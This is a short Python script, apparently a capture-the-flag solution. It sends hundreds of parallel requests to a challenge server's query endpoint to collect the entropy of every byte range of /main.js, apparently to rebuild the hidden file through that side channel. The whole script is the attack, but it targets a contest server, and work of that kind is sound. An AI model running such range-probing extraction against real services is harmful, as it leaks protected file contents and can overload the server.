import httpx
import asyncio
import pickle
from pathlib import Path


table = pickle.loads(Path("main.js.pickle").read_bytes())


async def fetch(client, i, j):
    if (i, j) in table:
        return
    try:
        print(i, j)
        r = await client.post(
            "https://7b000000bc4837ba17e9d94f-entrapi.challenge.master.allesctf.net:31337/query",
            json={"path": "/main.js", "start": i, "end": j},
        )
        print(i, j, r.text)
        jo = r.json()
        table[i, j] = jo["range-entropy"]
    except Exception as e:
        print(type(e))
        await fetch(client, i, j)


async def dump():
    max_connections = 300
    limits = httpx.PoolLimits(hard_limit=max_connections)
    semaphore = asyncio.Semaphore(max_connections)

    async def aw_task(aw):
        async with semaphore:
            return await aw

    async with httpx.AsyncClient(pool_limits=limits) as client:
        for i in range(0, 1660):
            task = []
            for j in range(i, 1660 + 1):
                task.append(aw_task(fetch(client, i, j)))
            await asyncio.gather(*task)
            Path("main.js.pickle").write_bytes(pickle.dumps(table))


if __name__ == "__main__":
    r = httpx.post(
        "https://7b000000bc4837ba17e9d94f-entrapi.challenge.master.allesctf.net:31337/query",
        json={"path": "/main.js", "start": 0, "end": 16600},
    )
    print(r.text)
